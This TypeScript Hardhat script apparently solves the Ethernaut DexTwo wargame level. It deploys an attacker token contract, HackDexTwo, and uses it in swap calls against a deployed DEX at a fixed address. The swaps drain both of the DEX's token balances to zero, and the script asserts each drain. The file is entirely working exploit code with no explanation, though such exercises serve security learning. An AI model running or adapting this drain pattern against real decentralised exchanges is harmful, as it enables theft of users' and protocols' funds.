import { expect } from "chai";
import { ethers } from "hardhat";
import { DexTwo, DexTwo__factory, HackDexTwo, HackDexTwo__factory } from "../typechain";

async function main() {
  const [addr1] = await ethers.getSigners();
  const deployedAddress = '0x3047F2Ad8DD63354076c780B1b19a07C45304CbF';
  const instance: DexTwo = DexTwo__factory.connect(deployedAddress, addr1);

  const attackInstance: HackDexTwo = await new HackDexTwo__factory(addr1).deploy({ gasLimit: 2000000 });
  await attackInstance.deployed();
  console.log("deployed : " + attackInstance.address)

  const tokenA: string = await instance.token1();
  const tokenB: string = await instance.token2();

  await (await attackInstance.transfer(deployedAddress, 1)).wait(1)
  await (await attackInstance.approve(deployedAddress, 100)).wait(1)
  await (await instance.swap(attackInstance.address, tokenA, 1)).wait(1)
  expect(await instance.balanceOf(tokenA, deployedAddress)).to.be.eq(0)
  await (await instance.swap(attackInstance.address, tokenB, 2)).wait(1)
  expect(await instance.balanceOf(tokenB, deployedAddress)).to.be.eq(0)
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
